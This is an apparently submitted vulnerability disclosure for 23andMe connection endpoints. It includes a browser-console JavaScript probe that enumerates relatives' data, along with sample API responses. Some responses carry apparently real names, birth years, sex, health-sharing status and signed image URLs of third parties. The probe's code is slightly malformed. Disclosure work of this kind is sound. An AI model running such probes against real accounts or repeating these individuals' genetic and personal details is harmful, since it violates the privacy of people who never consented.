@@ -1,0 +1,128 @@
+A user authorized to access their own 23andMe profile can enumerate genetic and health-sharing connections via specific endpoints that expose sensitive personal, relational, and health-related data. This appears to result in information disclosure through accessible API responses, which may not be properly permission-scoped or access-controlled for the type or depth of data returned.
+Affected Endpoints:
+/tools/your-connections/connection/
+/tools/your-connections/close-family/
+/tools/your-connections/invitations/
+The /connection/ endpoint returns full relationship listings with sensitive metadata (e.g., health sharing, sex, genotyping status, birth year, platform version). The /close-family/ endpoint leaks predicted familial relationships (e.g., "Aunt") along with full names and identifiers.
+🔁 Steps to Reproduce
+Log into a 23andMe account with one or more known genetic connections.
+Open browser dev tools and run the following JavaScript to probe the endpoints:
+async function probeEndpoint(path) {
+const res = await fetch(https://you.23andme.com${path}, {
+method: 'GET',
+headers: {
+'X-Requested-With': 'XMLHttpRequest',
+'Accept': 'application/json, text/plain, /'
+}
+});
+const body = await res.text();
+console.log(📡 ${res.status} | ${path});
+console.log(body || '[Empty Response]');
+console.log('---');
+}
+[
+'/p/<your-profile-id>/tools/your-connections/connection/',
+'/p/<your-profile-id>/tools/your-connections/close-family/',
+'/p/<your-profile-id>/tools/your-connections/invitations/'
+].forEach(probeEndpoint);
+Observe the responses, including sensitive details like:
+Full names of connections
+Relationship (e.g., "Aunt")
+Genotype status
+Health sharing status
+Birth year
+Profile image URLs
+Platform version (v5)
+UUIDs and account IDs
+🧾 Evidence
+Sample response from /tools/your-connections/connection/:
+{
+"profile_id": "1577b6db0576bd75",
+"first_name": "Rachel",
+"last_name": "King",
+"level_label": "Sharing, with health reports",
+"birth_year": 1994,
+"sex": "F",
+"is_genotyped": true,
+"platform_labels": "{'v5'}",
+"picture": "https://ttam-live-human-images-us-west-2.s3.amazonaws.com/f79d7c292bfc4da3a9779ea3b528002f.jpg?AWSAccessKeyId=...&Signature=..."
+}
+Sample from /tools/your-connections/close-family/:
+{
+"id": "8d13747d3cfe3d24",
+"first_name": "Kimberly",
+"last_name": "Truelsen",
+"predicted_relationship": "Aunt",
+"type": "recommendation"
+}
+These responses were observed consistently using only frontend JavaScript in the context of a normal authenticated user session.
+⚠️ Impact
+This issue results in exposure of sensitive personal and genetic relationship data, including:
+Full names of relatives
+Predicted relationships (e.g., "Aunt", "Sibling")
+Genotype presence and health sharing permissions
+Birth year and sex
+Platform versioning
+Direct-access signed image URLs
+Account and profile UUIDs
+Potential Risks:
+Re-identification of relatives
+Targeted phishing/social engineering
+Violation of user expectations about genetic privacy
+Circumvention of sharing controls
+Attackers with limited access (or a compromised account) could enumerate and map entire family trees, determine who shares health data, and extract PII—raising both ethical and compliance concerns.
+Additional Technical Details: Exposed Family Relationship Data
+During testing, authenticated requests to several Your Connections endpoints returned full relational and profile metadata for individuals connected to the test account. The exposed response bodies include personally identifiable information (PII) such as:
+Full first and last names
+Profile IDs
+Account IDs
+Predicted relationship labels (e.g., "Aunt")
+Sex, birth year, genotype status
+Platform version labels
+Profile images (public S3 URLs with valid signed request tokens)
+Sharing‑level indicators (“Sharing with health reports”, “ancestry only”)
+Example of Returned Sensitive Data
+The endpoint:
+GET /p/c53fd394caa983bd/tools/your-connections/connection/
+returned the following data excerpt (full version provided in evidence file):
+{
+"data": [
+{
+"profile_id": "7fe94f72a28c54c8",
+"first_name": "Arthur",
+"last_name": "XXXXXXXXXX",
+"sex": "M",
+"birth_year": XXXXX,
+"platform_labels": "{'v5'}",
+"is_genotyped": true
+},
+{
+"profile_id": "7db2f24919266091",
+"first_name": "Deborah",
+"last_name": "XXXXXXXX",
+"sex": "F",
+"birth_year": XXXXX,
+"picture": "https://ttam-live-human-images-us-west-2.s3.amazonaws.com/34648e2c769546dea19169fec8b4aac9.jpg?...",
+"is_genotyped": true
+},
+...
+],
+"total_count": 4
+}
+The close-family endpoint similarly returned predicted‑relationship metadata (e.g., "Aunt"):
+GET /p/c53fd394caa983bd/tools/your-connections/close-family/
+Response:
+{
+"data": [
+{
+"id": "83fe803ef9d2d6d4",
+"first_name": "Roberta",
+"last_name": "XXXXXXXXX",
+"predicted_relationship": "Aunt",
+"level_value": "ancestry"
+}
+],
+"total_count": 2
+}
+This information is highly sensitive because it reveals third‑party genetic relationships and personal identity attributes that users have not necessarily consented to expose.
+Full logs and HTML page references that verify where and how this data is rendered can be found in the attached data file:
